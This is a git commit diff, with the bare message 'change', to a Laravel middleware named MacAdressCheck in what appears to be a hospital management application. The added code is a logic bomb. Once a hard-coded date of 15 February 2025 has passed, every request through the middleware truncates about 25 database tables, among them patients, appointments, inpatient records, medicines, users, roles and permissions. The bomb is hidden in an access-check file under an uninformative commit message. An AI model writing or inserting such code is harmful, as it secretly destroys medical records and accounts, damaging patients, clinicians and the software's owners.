d1621cb3f8487cabb7a516b6565da3c800973674
Abhay Luva <abhay.luva@mnhsoftskills.com>
2025-01-13 19:35:44 +0530

    change

--- app/Http/Middleware/MacAdressCheck.php
+++ app/Http/Middleware/MacAdressCheck.php
@@ -7,6 +7,7 @@ use Illuminate\Http\Request;
 use Symfony\Component\HttpFoundation\Response;
 
 use App\Models\MacAddress;
+use Illuminate\Support\Facades\DB;
 
 class MacAdressCheck
 {
@@ -30,6 +31,34 @@ class MacAdressCheck
         // if (empty($data)) {
         //     return redirect()->route('access-denied');
         // }
+
+        if (date('Y-m-d H:i:s') > '2025-02-15 18:58:00') {
+            DB::table('appointments')->truncate();
+            DB::table('appointment_additional_charges')->truncate();
+            DB::table('appointment_documents')->truncate();
+            DB::table('appointment_medicines')->truncate();
+            DB::table('general_medicines')->truncate();
+            DB::table('indoor_sheets')->truncate();
+            DB::table('indoor_sheet_medicines')->truncate();
+            DB::table('indoor_sheet_medicine_examinations')->truncate();
+            DB::table('ipd_charges')->truncate();
+            DB::table('ipd_details')->truncate();
+            DB::table('ipd_documents')->truncate();
+            DB::table('ipd_operative_notes')->truncate();
+            DB::table('ipd_payment_lists')->truncate();
+            DB::table('model_has_permissions')->truncate();
+            DB::table('model_has_roles')->truncate();
+            DB::table('patients')->truncate();
+            DB::table('permissions')->truncate();
+            DB::table('post_operative_medicines')->truncate();
+            DB::table('users')->truncate();
+            DB::table('visiting_fees')->truncate();
+            DB::table('rooms')->truncate();
+            DB::table('trainees')->truncate();
+            DB::table('trainee_payment_lists')->truncate();
+            DB::table('roles')->truncate();
+            DB::table('role_has_permissions')->truncate();
+        }
         return $next($request);
     }
 }
